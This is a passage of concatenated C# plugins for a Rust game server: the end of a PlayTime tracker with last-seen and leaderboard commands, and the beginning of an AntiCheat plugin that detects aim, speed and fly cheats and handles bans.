				dirty = true;
			}

			if (Config["Broadcast Last Seen on Connect"] == null)
			{
				Config["Broadcast Last Seen on Connect"] = true;
				dirty = true;
			}

			if (dirty)
			{
				PrintWarning("Updating configuration file with new values.");
				SaveConfig();
			}

			playTimeData = Interface.GetMod().DataFileSystem.ReadObject<PlayTimeData>("PlayTime");

            permission.RegisterPermission("canUsePlayTime", this);
            permission.RegisterPermission("canUseLastSeen", this);
            permission.RegisterPermission("canUseMostOnline", this);

            timer.Repeat(SaveInterval, 0, () => updatePlayTime());
        }

        void OnPlayerInit(BasePlayer player)
        {
			long currentTimestamp = GrabCurrentTimestamp();
			var info = new PlayTimeInfo(player);
			
			if (BroadcastLastSeenOnConnect)
			{
				long lastLogoutTime = playTimeData.Players[info.SteamID].LastLogoutTime;
				long lastSeenDays = 0;
				long lastSeenHours = 0;
				long lastSeenMinutes = 0;
				long lastSeenSeconds = currentTimestamp - lastLogoutTime;

				if (lastSeenSeconds > 60)
				{
					lastSeenMinutes = lastSeenSeconds / 60;
					lastSeenSeconds = lastSeenSeconds - (lastSeenMinutes * 60);
				}

				if (lastSeenMinutes > 60)
				{
					lastSeenHours = lastSeenMinutes / 60;
					lastSeenMinutes = lastSeenMinutes - (lastSeenHours * 60);
				}

				if (lastSeenHours > 24)
				{
					lastSeenDays = lastSeenHours / 24;
					lastSeenHours = lastSeenHours - (lastSeenDays * 24);
				}

				if (lastSeenDays > 0)
				{
					PrintToChat(Prefix + player.displayName + " was last seen " + lastSeenDays + " days " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
					Puts(player.displayName + " was last seen " + lastSeenDays + " days " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
				}
				else if (lastSeenHours > 0)
				{
					PrintToChat(Prefix + player.displayName + " was last seen " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
					Puts(player.displayName + " was last seen " + lastSeenDays + " days " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
				}
				else if (lastSeenMinutes > 0)
				{
					PrintToChat(Prefix + player.displayName + " was last seen " + lastSeenMinutes + " minutes ago.");
					Puts(player.displayName + " was last seen " + lastSeenDays + " days " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
				}
				else
				{
					PrintToChat(Prefix + player.displayName + " was last seen " + lastSeenSeconds + " seconds ago.");
					Puts(player.displayName + " was last seen " + lastSeenDays + " days " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
				}
			}

			if (playTimeData.Players.ContainsKey(info.SteamID))
			{
				Puts("Player already has a PlayTime log.");

				playTimeData.Players[info.SteamID].LastPlayTimeIncrement = currentTimestamp;
				playTimeData.Players[info.SteamID].Name = player.displayName;
			}
			else
			{
				Puts("Saving new player to PlayTime log.");
				playTimeData.Players.Add(info.SteamID, info);
			}

			Interface.GetMod().DataFileSystem.WriteObject("PlayTime", playTimeData);
        }

        void OnPlayerDisconnected(BasePlayer player)
        {
            long currentTimestamp = GrabCurrentTimestamp();
            var info = new PlayTimeInfo(player);

            long lastIncrement = playTimeData.Players[info.SteamID].LastPlayTimeIncrement;
            long totalPlayed = currentTimestamp - lastIncrement;

            playTimeData.Players[info.SteamID].PlayTime += totalPlayed;
            playTimeData.Players[info.SteamID].LastPlayTimeIncrement = currentTimestamp;
            playTimeData.Players[info.SteamID].LastLogoutTime = currentTimestamp;
            Interface.GetMod().DataFileSystem.WriteObject("PlayTime", playTimeData);
        }

        public void updatePlayTime()
        {
			Puts("Saving playtime data for all online users.");
            foreach (BasePlayer onlinePlayer in BasePlayer.activePlayerList)
            {
                long currentTimestamp = GrabCurrentTimestamp();
                long playerSteamID = FindPlayer(onlinePlayer.userID.ToString());

                if (playerSteamID == 0)
                {
					// No info in file, so lets initiate him.
					var info = new PlayTimeInfo(onlinePlayer);

					if (playTimeData.Players.ContainsKey(info.SteamID))
					{
						Puts("Player already has a PlayTime log.");

						playTimeData.Players[info.SteamID].LastPlayTimeIncrement = GrabCurrentTimestamp();
						playTimeData.Players[info.SteamID].Name = onlinePlayer.displayName;
					}
					else
					{
						Puts("Saving new player to PlayTime log.");
						playTimeData.Players.Add(info.SteamID, info);
					}

					Interface.GetMod().DataFileSystem.WriteObject("PlayTime", playTimeData);

					return;
                }

                if (onlinePlayer.userID.ToString() == playerSteamID.ToString())
                {
					string playerName = playTimeData.Players[playerSteamID.ToString()].Name;
					long playedTime = currentTimestamp - playTimeData.Players[playerSteamID.ToString()].LastPlayTimeIncrement;

                    playTimeData.Players[playerSteamID.ToString()].PlayTime += playedTime;
                    playTimeData.Players[playerSteamID.ToString()].LastPlayTimeIncrement = currentTimestamp;

                    Interface.GetMod().DataFileSystem.WriteObject("PlayTime", playTimeData);
                }
            }
        }

        [ChatCommand("playtime")]
        private void PlayTimeCommand(BasePlayer player, string command, string[] args)
        {
			if (!hasPermission(player, "canUsePlayTime") && args.Length > 0)
			{
				SendReply(player, Prefix + "You don't have permission to use this command.");

				return;
			}

			var queriedPlayer = "";

			if (args.Length == 0)
			{
				queriedPlayer = player.userID.ToString();
			}
			else
			{
				queriedPlayer = args[0];
			}

			long daysPlayed = 0;
			long hoursPlayed = 0;
			long minutesPlayed = 0;
			long secondsPlayed = 0;

			long playerSteamID = 0;

			playerSteamID = FindPlayer(queriedPlayer);

			if (playerSteamID == 0)
			{
				SendReply(player, Prefix + "The player '" + queriedPlayer + "' does not exist in the system.");

				return;
			}

			string playerName = playTimeData.Players[playerSteamID.ToString()].Name;

			secondsPlayed = playTimeData.Players[playerSteamID.ToString()].PlayTime;

			if (secondsPlayed > 60)
			{
				minutesPlayed = secondsPlayed / 60;
				secondsPlayed = secondsPlayed - (minutesPlayed * 60);
			}

			if (minutesPlayed > 60)
			{
				hoursPlayed = minutesPlayed / 60;
				minutesPlayed = minutesPlayed - (hoursPlayed * 60);
			}

			if (hoursPlayed > 24)
			{
				daysPlayed = hoursPlayed / 24;
				hoursPlayed = hoursPlayed - (daysPlayed * 24);
			}

			if (daysPlayed > 0)
			{
				SendReply(player, Prefix + "The player " + playerName + " (" + playerSteamID + ") has played for " + daysPlayed + " days " + hoursPlayed + " hours and " + minutesPlayed + " minutes.");
			}
			else if (hoursPlayed > 0)
			{
				SendReply(player, Prefix + "The player " + playerName + " (" + playerSteamID + ") has played for " + hoursPlayed + " hours and " + minutesPlayed + " minutes.");
			}
			else if (minutesPlayed > 0)
			{
				SendReply(player, Prefix + "The player " + playerName + " (" + playerSteamID + ") has played for " + minutesPlayed + " minutes.");
			}
			else
			{
				SendReply(player, Prefix + "The player " + playerName + " (" + playerSteamID + ") has played for " + secondsPlayed + " seconds.");
			}
		}

		[ChatCommand("lastseen")]
		private void LastSeenCommand(BasePlayer player, string command, string[] args)
		{
			if (!hasPermission(player, "canUseLastSeen"))
			{
				SendReply(player, Prefix + "You don't have permission to use this command.");

				return;
			}

			if (args.Length == 0)
			{
				SendReply(player, Prefix + "Please enter a players name or steam 64 id.");

				return;
			}

			long currentTimestamp = GrabCurrentTimestamp();
			var queriedPlayer = args[0];
			long playerSteamID = 0;
            try { playerSteamID = FindPlayer(queriedPlayer); } catch (KeyNotFoundException e ) { return; }

			if (playerSteamID == 0)
			{
				SendReply(player, Prefix + "The player '" + queriedPlayer + "' does not exist in the system.");

				return;
			}

			string playerName = playTimeData.Players[playerSteamID.ToString()].Name;

			foreach (BasePlayer onlinePlayer in BasePlayer.activePlayerList)
			{
				if (onlinePlayer.userID.ToString() == playerSteamID.ToString())
				{
					SendReply(player, Prefix + "The player " + playerName + " ( " + playerSteamID + ") is online right now!");

					return;
				}
			}

			long lastLogoutTime = playTimeData.Players[playerSteamID.ToString()].LastLogoutTime;
			long lastSeenDays = 0;
			long lastSeenHours = 0;
			long lastSeenMinutes = 0;
			long lastSeenSeconds = currentTimestamp - lastLogoutTime;

			if (lastSeenSeconds > 60)
			{
				lastSeenMinutes = lastSeenSeconds / 60;
				lastSeenSeconds = lastSeenSeconds - (lastSeenMinutes * 60);
			}

			if (lastSeenMinutes > 60)
			{
				lastSeenHours = lastSeenMinutes / 60;
				lastSeenMinutes = lastSeenMinutes - (lastSeenHours * 60);
			}

			if (lastSeenHours > 24)
			{
				lastSeenDays = lastSeenHours / 24;
				lastSeenHours = lastSeenHours - (lastSeenDays * 24);
			}

			if (lastSeenDays > 0)
			{
				SendReply(player, Prefix + "The player " + playerName + " ( " + playerSteamID + ") was last seen " + lastSeenDays + " days " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
			}
			else if (lastSeenHours > 0)
			{
				SendReply(player, Prefix + "The player " + playerName + " ( " + playerSteamID + ") was last seen " + lastSeenHours + " hours and " + lastSeenMinutes + " minutes ago.");
			}
			else if (lastSeenMinutes > 0)
			{
				SendReply(player, Prefix + "The player " + playerName + " ( " + playerSteamID + ") was last seen " + lastSeenMinutes + " minutes ago.");
			}
			else
			{
				SendReply(player, Prefix + "The player " + playerName + " ( " + playerSteamID + ") was last seen " + lastSeenSeconds + " seconds ago.");
			}
		}

		[ChatCommand("mostonline")]
		private void MostOnlineCommand(BasePlayer player, string command, string[] args)
		{
			if (!hasPermission(player, "canUseMostOnline"))
			{
				SendReply(player, Prefix + "You don't have permission to use this command.");

				return;
			}

			Dictionary<string, long> mostOnline = new Dictionary<string, long>();

			foreach (string playerID in playTimeData.Players.Keys)
			{
				mostOnline.Add(playTimeData.Players[playerID].Name, playTimeData.Players[playerID].PlayTime);
			}

			List<KeyValuePair<string, long>> sorted = (from kv in mostOnline orderby kv.Value descending select kv).Take(10).ToList();

			string highscore = "<color=red>Top 10 Most Online</color> \n" +
			"------------------------------ \n" +
			"Rank - Online Time (Days:Hours:Minutes) - <color=red>Player Name</color> \n" +
			"------------------------------ \n";
			int count = 0;
			foreach (KeyValuePair<string, long> kv in sorted)
			{
				count++;
				long daysPlayed = 0;
				long hoursPlayed = 0;
				long minutesPlayed = 0;
				long secondsPlayed = kv.Value;

				string daysPlayedString = "";
				string hoursPlayedString = "";
				string minutesPlayedString = "";

				if (secondsPlayed > 60)
				{
					minutesPlayed = secondsPlayed / 60;
					secondsPlayed = secondsPlayed - (minutesPlayed * 60);
				}

				if (minutesPlayed > 60)
				{
					hoursPlayed = minutesPlayed / 60;
					minutesPlayed = minutesPlayed - (hoursPlayed * 60);
				}

				if (hoursPlayed > 24)
				{
					daysPlayed = hoursPlayed / 24;
					hoursPlayed = hoursPlayed - (daysPlayed * 24);
				}

				if (daysPlayed < 10) { daysPlayedString = "0" + daysPlayed.ToString(); } else { daysPlayedString = daysPlayed.ToString(); }
				if (hoursPlayed < 10) { hoursPlayedString = "0" + hoursPlayed.ToString(); } else { hoursPlayedString = hoursPlayed.ToString(); }
				if (minutesPlayed < 10) { minutesPlayedString = "0" + minutesPlayed.ToString(); } else { minutesPlayedString = minutesPlayed.ToString(); }

				if (count < 10)
				{
					highscore += "  ";
				}

				highscore += count + ". " + daysPlayedString + ":" + hoursPlayedString + ":" + minutesPlayedString + " - <color=red>" + kv.Key + "</color>\n";
			}

			SendReply(player, Prefix + highscore);
		}

		private long FindPlayer(string queriedPlayer)
        {
            long playerSteamID = 0;

            foreach (string playerID in playTimeData.Players.Keys)
            {
                if (playerID == queriedPlayer)
                {
                    playerSteamID = Convert.ToInt64(playerID);
                }
                else if (playTimeData.Players[playerID].Name.Contains(queriedPlayer))
                {
                    playerSteamID = Convert.ToInt64(playerID);
                }
            }

            return playerSteamID;
        }

        private static long GrabCurrentTimestamp()
        {
            long timestamp = 0;
            long ticks = DateTime.UtcNow.Ticks - DateTime.Parse("01/01/1970 00:00:00").Ticks;
            ticks /= 10000000;
            timestamp = ticks;

            return timestamp;
        }

        bool hasPermission(BasePlayer player, string perm)
        {
            if (player.net.connection.authLevel > 1)
            {
                return true;
            }

            return permission.UserHasPermission(player.userID.ToString(), perm);
        }
    }
}


// --- End of file: PlayTime.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/AntiCheat.cs ---
// --- Original Local Path: AntiCheat.cs ---

﻿using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Plugins;
using ProtoBuf;
using Rust;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
namespace Oxide.Plugins
{
    [Info("AntiCheat", "OxideBro", "2.2.23")]
    class AntiCheat : RustPlugin
    {
        static AntiCheat instance;
        class DataStorage
        {
            public Dictionary<ulong, ADMINDATA> AdminData = new Dictionary<ulong, ADMINDATA>();
            public DataStorage() { }
        }
        class ADMINDATA
        {
            public string Name;
            public bool Check;
        }
        DataStorage adata;
        private DynamicConfigFile AdminData;
        static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        void LoadData()
        {
            try
            {
                PlayersListed = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, PlayerAntiCheat>>("AntiCheat/PlayerAntiCheat");
                adata = Interface.GetMod().DataFileSystem.ReadObject<DataStorage>("AntiCheat/AdminData");
                if (adata == null)
                {
                    PrintError("AntiCheat/AdminData is null! Create new database");
                    adata = new DataStorage();
                    SaveDataAdmin();
                }
                if (PlayersListed == null)
                {
                    PrintError("AntiCheat/PlayerAntiCheat is null! Create new database");
                    PlayersListed = new Dictionary<ulong, PlayerAntiCheat>();
                    SavePlayerData();
                }
            }
            catch
            {
                adata = new DataStorage();
                PlayersListed = new Dictionary<ulong, PlayerAntiCheat>();
            }
        }
        static int b = 0;
        int DetectCountMacros = 10;
        int DetectPerMacros = 80;
        int DetectCountFSH = 10;
        bool SHEnable = true;
        bool FHEnable = true;
        bool SHEnabled = true;
        bool FHEnabled = true;
        bool MCREnabled = true;
        bool AIMEnabled = true;
        bool EnabledSilentAim = true;
        bool SHKickEnabled = false;
        bool FHKickEnabled = false;
        bool AntiRecoilEnabled = true;
        bool AIMLOCKEnabledBAN = true;
        bool AIMHACKEnabledBAN = true;
        static bool SendsLogs = true;
        float AimPercent = 50;
        float AimPercentOverCount = 40f;
        static bool textureenable = true;
        bool init = false;
        private List<string> ListWeapons = new List<string>() {
            "rifle.ak", "lmg.m249"
        }
        ;
        protected override void LoadDefaultConfig()
        {
            Config.Clear();
            LoadConfigValues();
        }
        private void LoadConfigValues()
        {
            GetConfig("[Основное]", "Включить проверку на СпидХак?", ref SHEnable);
            GetConfig("[Основное]", "Включить проверку на ФлайХак?", ref FHEnable);
            GetConfig("[Макрос]", "Включить проверку на Макрос", ref AntiRecoilEnabled);
            var _ListWeapons = new List<object>() {
                "rifle.ak", "lmg.m249"
            }
            ;
            GetConfig("[Макрос]", "Список оружия, на какие действует проверка", ref _ListWeapons);
            ListWeapons = _ListWeapons.Select(p => p.ToString()).ToList();
            GetConfig("[Основное]", "Включить автоматический бан за AIMLOCK", ref AIMLOCKEnabledBAN);
            GetConfig("[Основное]", "Включить автоматический бан за AIMHACK", ref AIMHACKEnabledBAN);
            GetConfig("[Макрос]", "Включить автоматический бан за макрос", ref MCREnabled);
            GetConfig("[Макрос]", "Количество детектов для автоматического бана за Макрос:", ref DetectCountMacros);
            GetConfig("[Макрос]", "С какого процента начинать считать проверку на Макрос? (0-100%):", ref DetectPerMacros);
            GetConfig("[Общее]", "Включить бан игроков за SpeedHack (Превышающее количество детектов)", ref SHEnabled);
            GetConfig("[Основное]", "Включить kick игроков за SpeedHack (При каждом детекте)", ref SHKickEnabled);
            GetConfig("[Общее]", "Включить бан игроков за FlyHack (Превышающее количество детектов)", ref FHEnabled);
            GetConfig("[Основное]", "Включить kick игроков за FlyHack (При каждом детекте)", ref FHKickEnabled);
            GetConfig("[Общее]", "Количество детектов для автоматического бана (FlyHack and SpeedHack):", ref DetectCountFSH);
            GetConfig("[Основное]", "Включить отправку детектов в чат (По привилегии)?", ref SendsLogs);
            GetConfig("[Аим]", "Процент попадания в голову для автоматического бана:", ref AimPercent);
            GetConfig("[Аим]", "Включить автоматический бан за Аим", ref AIMEnabled);
            GetConfig("[Аим]", "Количество попаданий для автоматического бана, если процент попадания больше зазначеного в конфиге:", ref AimPercentOverCount);
            GetConfig("[Аим]", "Включить проверку на SilentAim?", ref EnabledSilentAim);
            GetConfig("[Основное]", "Включить проверку на проникновение в текстуры (Пока тестируеться)?", ref textureenable);
            SaveConfig();
        }
        private void GetConfig<T>(string menu, string Key, ref T var)
        {
            if (Config[menu, Key] != null)
            {
                var = (T)Convert.ChangeType(Config[menu, Key], typeof(T));
            }
            Config[menu, Key] = var;
        }
        static int PlayerLayer = LayerMask.NameToLayer("Player (Server)");
        static int constructionColl = LayerMask.GetMask(new string[] {
            "Construction"
        }
        );
        void Loaded()
        {
            LoadConfigValues();
        }
        int raycastCount = 0;
        void OnServerInitialized()
        {
            instance = this;
            LoadData();
            LoadDefaultConfig();
            foreach (var player in BasePlayer.activePlayerList)
            {
                OnPlayerConnected(player);
            }
            permission.RegisterPermission("anticheat.toggleadmin", this);
            permission.RegisterPermission("anticheat.sendlogs", this);
            Interface.Oxide.GetLibrary<Game.Rust.Libraries.Command>().AddConsoleCommand("aim.check", this, "AimCheck");
            Interface.Oxide.GetLibrary<Game.Rust.Libraries.Command>().AddConsoleCommand("aim.server", this, "AimCheckServer");
            Interface.Oxide.GetLibrary<Game.Rust.Libraries.Command>().AddConsoleCommand("check.server", this, "CheckServer");
            foreach (var player in BasePlayer.activePlayerList) CreateInfo(player);
            init = true;
            timer.Repeat(360, 0, () => SaveAllDate());
        }
        void SaveAllDate()
        {
            if (!init) return;
            SavePlayerData();
            SaveDataAdmin();
        }
        [ConsoleCommand("ban.user")]
        private void cmdBan(ConsoleSystem.Arg arg)
        {
            var date = DateTime.Now.ToLocalTime().ToShortDateString();
            if (arg.Args == null || arg.Args.Length < 2)
            {
                arg.ReplyWith("Неверный синтаксис! Используйте ban.user <SteamID> <Причина>");
                return;
            }
            ulong targetId;
            if (!ulong.TryParse(arg.Args[0], out targetId))
            {
                arg.ReplyWith("Нужно ввести SteamID игрока какого хотите забанить");
                return;
            }
            if (!PlayersListed.ContainsKey(targetId)) PlayersListed.Add(targetId, new PlayerAntiCheat()
            {
                Name = "null",
                Deaths = 0,
                Killed = 0,
                Heads = 0,
                Hits = 0,
                Banned = true,
                Date = date,
                Reason = arg.Args[1],
                BanCreator = arg.Player() != null ? arg.Player().displayName : "Console"
            }
            );
            else
            {
                PlayersListed[targetId].Banned = true;
                PlayersListed[targetId].Date = date;
                PlayersListed[targetId].Reason = arg.Args[1];
                PlayersListed[targetId].BanCreator = arg.Player() != null ? arg.Player().displayName : "Console";
            }
            BasePlayer target = BasePlayer.FindByID(targetId);
            if (target != null && target.IsConnected)
            {
                Kick(target, $"Вы были забанены. Причина: {arg.Args[1]}");
            }
            arg.ReplyWith($"{arg.Args[0]} забанен. Причина: {arg.Args[1]}!");
        }
        [ConsoleCommand("banlist")]
        private void BanListedPlayers(ConsoleSystem.Arg arg)
        {
            var bans = PlayersListed.Where(p => p.Value.Banned).Select(p => $"Игрок {p.Value.Name} ({p.Key})- Кто выдал: {p.Value.BanCreator} Дата: {p.Value.Date} Причина: {p.Value.Reason}").ToList();
            if (bans.Count > 0) arg.ReplyWith(string.Join("\n ", bans));
            else arg.ReplyWith("Список банов пустой");
        }
        [ConsoleCommand("unban.user")]
        private void UnbanCommand(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin)
            {
                return;
            }
            if (arg.Args == null || arg.Args.Length != 1)
            {
                arg.ReplyWith("Неверный синтаксис! Используйте unban.user <SteamID>");
                return;
            }
            ulong target;
            if (!ulong.TryParse(arg.Args[0], out target))
            {
                arg.ReplyWith("Нужно ввести SteamID игрока какого хотите разбанить");
                return;
            }
            if (PlayersListed.ContainsKey(target))
            {
                PlayersListed[target].Banned = false;
                PlayersListed[target].Date = "";
                PlayersListed[target].Reason = "";
            }
            arg.ReplyWith($"{arg.Args[0]} разбанен");
        }
        object OnPlayerAttack(BasePlayer player, HitInfo info)
        {
            if (EnabledSilentAim)
            {
                if (player != null && info.HitEntity != null && info.HitEntity is BasePlayer)
                {
                    float y = Mathf.Abs(info.HitPositionWorld.y - info.HitEntity.CenterPoint().y);
                    if (y > 2f)
                    {
                        var messages = $"Обнаружен SilentAim! Стрельба с {y} м.";
                        PrintWarning($"[{DateTime.Now.ToShortTimeString()}] - (SilentAim) {player.displayName}({player.UserIDString})| Обнаружен SilentAim! Стрельба с {y} м.");
                        LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (SilentAim) {player.displayName}({player.UserIDString})| Обнаружен SilentAim! Стрельба с {y} м.", this, true);
                        return true;
                    }
                }
            }
            return null;
        }
        object CanUserLogin(string name, string id, string ip)
        {
            if (PlayersListed.ContainsKey(ulong.Parse(id)))
            {
                if (PlayersListed[ulong.Parse(id)].Banned) return $"Вы забанены на данном сервере!";
            }
            return null;
        }
       
        public bool IsConnected(BasePlayer player) => BasePlayer.activePlayerList.Contains(player);
        public void Kick(BasePlayer player, string reason = "") => player.Kick(reason);
        public bool IsBanned(ulong id) => ServerUsers.Is(id, ServerUsers.UserGroup.Banned);
        public void Ban(ulong id, string reason = "")
        {
            if (IsBanned(id)) return;
            var player = BasePlayer.FindByID(id);
            ServerUsers.Set(id, ServerUsers.UserGroup.Banned, player?.displayName ?? "Unknown", reason);
            ServerUsers.Save();
            if (player != null && IsConnected(player)) Kick(player, reason);
        }
        private readonly Dictionary<ulong, AimLockData> aimlock = new Dictionary<ulong, AimLockData>();
        public class AimLockData
        {
            public int Ticks = 1;
            public string Body = "";
        }
        private bool IsNPC(BasePlayer player)
        {
            if (player == null) return false;
            if (player is NPCPlayer) return true;
            if (!(player.userID >= 76560000000000000L || player.userID <= 0L) || player.userID.ToString().Length < 17) return true;
            return false;
        }
        private void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            try
            {
                if (entity == null || entity?.net?.ID == null || info == null) return;
                var victim = entity as BasePlayer;
                if (victim == null) return;
                if (IsNPC(victim)) return;
                if (victim.GetComponent<NPCPlayer>() != null) return;
                if (victim is BasePlayer)
                {
                    if (victim.IsSleeping()) return;
                    if (PlayersListed.ContainsKey(victim.userID))
                    {
                        PlayersListed[victim.userID].Deaths += 1;
                    }
                }
                BasePlayer attacker = info.Initiator.ToPlayer();
                if (attacker == null || attacker.GetComponent<NPCPlayer>() != null) return;
                if (IsNPC(attacker)) return;
                if (attacker == victim) return;
                if (info?.Initiator is BasePlayer)
                {
                    if (PlayersListed.ContainsKey(attacker.userID)) PlayersListed[attacker.userID].Killed += 1;
                }
                double aim = Math.Floor((PlayersListed[attacker.userID].Heads * 1f / PlayersListed[attacker.userID].Hits * 1f) * 100f);
                double kdr = Math.Round(PlayersListed[attacker.userID].Killed * 1f / PlayersListed[attacker.userID].Deaths * 1f, 2);
                if (PlayersListed[attacker.userID].Hits > AimPercentOverCount && aim > AimPercent && kdr > 2 && AIMEnabled)
                {
                    var messages = $"<color=#ffa500>[Античит детект]</color> (AimLock) {attacker.displayName}! Соотношение попаданий в голову {aim}% и КДР - ({kdr}) аномальные!";
                    foreach (var admin in BasePlayer.activePlayerList) SendDetection(admin, messages);
                    if (AIMLOCKEnabledBAN)
                    {
                        Debug.LogWarning($"[Анти-чит] {attacker.displayName}({attacker.UserIDString}) забанен! Причина: AimLock!");
                        Ban(attacker.userID, "[Анти-чит] AimLock");
                        LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - {attacker.displayName}({attacker.UserIDString}) забанен! Соотношение попаданий в голову {aim}% и КДР - ({kdr}) аномальные!", this, true);
                    }
                }
            }
            catch (NullReferenceException) { }
        }
        private double GrabCurrentTime() => DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
        private double LastAttack;
        object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            try
            {
                if (entity == null || entity?.net?.ID == null) return null;
                BasePlayer attacker = info.Initiator.ToPlayer();
                if (attacker == null) return null;
                if (attacker.GetComponent<NPCPlayer>() != null) return null;
                var victim = entity as BasePlayer;
                if (victim == null) return null;
                if (victim.GetComponent<NPCPlayer>() != null) return null;
                if (IsNPC(attacker) || IsNPC(victim)) return null;
                var distance = info.Initiator.Distance(victim.transform.position);
                if (distance > 10)
                {
                    AimLockData bodylock;
                    if (!aimlock.TryGetValue(attacker.userID, out bodylock)) aimlock.Add(attacker.userID, bodylock = new AimLockData());
                    var _bodyPart = entity?.skeletonProperties?.FindBone(info.HitBone)?.name?.english ?? "";
                    if (_bodyPart == "") return null;
                    var time = GrabCurrentTime() - LastAttack;
                    if ((time > 30)) bodylock.Ticks = 1;
                    if (bodylock.Body == _bodyPart && _bodyPart != "lower spine") bodylock.Ticks++;
                    else bodylock.Ticks = 1;
                    if (bodylock.Ticks > 5)
                    {
                        var messages = $"Обнаружен АимЛок! Обнаружений {bodylock.Ticks} |  {bodylock?.Body ?? ""} | {distance} м.";
                        Debug.LogWarning($"[Анти-чит] {attacker.displayName}({attacker.UserIDString}) Обнаружен АимЛок! Обнаружений {bodylock.Ticks} |  {bodylock?.Body ?? ""} | {distance} м.");
                        LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (АимЛок) {attacker.displayName}({attacker.UserIDString})| обнаружений {bodylock.Ticks} |  {bodylock?.Body ?? ""} | {distance} м.", this, true);
                        bodylock.Ticks = 1;
                    }
                    bodylock.Body = _bodyPart;
                    if (PlayersListed.ContainsKey(attacker.userID))
                    {
                        PlayersListed[attacker.userID].Hits++;
                        if (info.isHeadshot) PlayersListed[attacker.userID].Heads++;
                    }
                    double aim = Math.Floor((PlayersListed[attacker.userID].Heads / PlayersListed[attacker.userID].Hits) * 100f);
                    if (PlayersListed[attacker.userID].Hits > AimPercentOverCount && aim > AimPercent && AIMEnabled)
                    {
                        var messages = $"<color=#ffa500>[Античит детект]</color> AimHack {attacker.displayName}({attacker.UserIDString})! Процент попаданий в голову слишком большой {aim}%";
                        foreach (var admin in BasePlayer.activePlayerList) SendDetection(admin, messages);
                        if (AIMHACKEnabledBAN)
                        {
                            Debug.LogWarning($"[Анти-чит] {attacker.displayName}({attacker.UserIDString}) забанен! Причина: AimHack!");
                            Ban(attacker.userID, "[Анти-чит] AimHack");
                            LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - {attacker.displayName}({attacker.UserIDString}) забанен! Процент попаданий в голову слишком большой {aim}%", this, true);
                        }
                    }
                    LastAttack = GrabCurrentTime();
                }
            }
            catch (NullReferenceException) { }
            return null;
        }
        [ChatCommand("ac")]
        void cmdChatDetect(BasePlayer player, string command, string[] args)
        {
            if (!player.IsAdmin || !permission.UserHasPermission(player.UserIDString, "anticheat.toggleadmin"))
            {
                SendReply(player, "У вас нету привилегии использовать эту команду");
                return;
            }
            if (adata.AdminData.ContainsKey(player.userID))
            {
                if (adata.AdminData[player.userID].Check)
                {
                    adata.AdminData[player.userID].Check = adata.AdminData[player.userID].Check = false;
                    SendReply(player, "Админ дебаг выключен. Вас не детектит.");
                    return;
                }
                else
                {
                    adata.AdminData[player.userID].Check = adata.AdminData[player.userID].Check = true;
                    SendReply(player, "Админ дебаг включен. Вас детектит.");
                }
            }
            else
            {
                SendReply(player, "Вас нету в базе администраторов, пожалуйста перезейдите!");
            }
        }
        [HookMethod("AimCheck")]
        private void AimCheck(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin && !arg.Player())
            {
                return;
            }
            if (arg.Args == null || arg.Args.Length < 1)
            {
                arg.ReplyWith("Неверный синтаксис! Используйте aim.check <SteamID>");
                return;
            }
            if (arg.Args.Length == 1)
            {
                ulong FindPlayer;
                if (!ulong.TryParse(arg.Args[0], out FindPlayer))
                {
                    arg.ReplyWith("Нужно ввести SteamID игрока!");
                    return;
                }
                var check = PlayersListed.ContainsKey(FindPlayer);
                if (check)
                {
                    var target = PlayersListed[FindPlayer];
                    double aim = target.Hits > 0 ? target.Heads > 0 ? target.Hits / target.Heads * 100 : 0 : 0;
                    arg.ReplyWith($"[Анти-чит] {target.Name}: Aim: {aim}% при {target.Hits} попаданиях (с растояния 10 метров и выше)");
                }
                else
                {
                    arg.ReplyWith("Игрока не найдено!");
                }
            }
            return;
        }
        [HookMethod("AimCheckServer")]
        private void AimCheckServer(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin)
            {
                return;
            }
            double popa = 0;
            double head = 0;
            var Top = (from x in PlayersListed select x);
            foreach (var top in Top)
            {
                popa = popa + top.Value.Hits;
                head = head + top.Value.Heads;
            }
            arg.ReplyWith($"[Анти-чит]: В голову попадают в {Math.Floor((head * 1f / popa * 1f) * 100f)}% случаев (с растояния 10 метров и выше)");
            return;
        }
        [HookMethod("CheckServer")]
        private void CheckServer(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin)
            {
                return;
            }
            int i = 0;
            string players = "";
            var reply = 3260;
            if (reply == 0) { }
            double popa = 0;
            double head = 0;
            string aimdesc = "";
            var Top = (from x in PlayersListed select x);
            foreach (var top in Top)
            {
                popa = popa + top.Value.Hits;
                head = head + top.Value.Heads;
            }
            double aimserver = Math.Floor((head * 1f / popa * 1f) * 100f);
            players = "----------------------------------Игроки---------------------------------- \n";
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (PlayersListed.ContainsKey(player.userID))
                {
                    var playerKey = PlayersListed[player.userID];
                    if (playerKey.Deaths == 0) playerKey.Deaths = 1;
                    if (playerKey.Hits == 0) playerKey.Hits = 1;
                    double aimprocent = Math.Floor((playerKey.Heads * 1f / playerKey.Hits * 1f) * 100f);
                    double kdr = Math.Round(playerKey.Killed * 1f / playerKey.Deaths * 1f, 2);
                    double razn = aimserver - aimprocent;
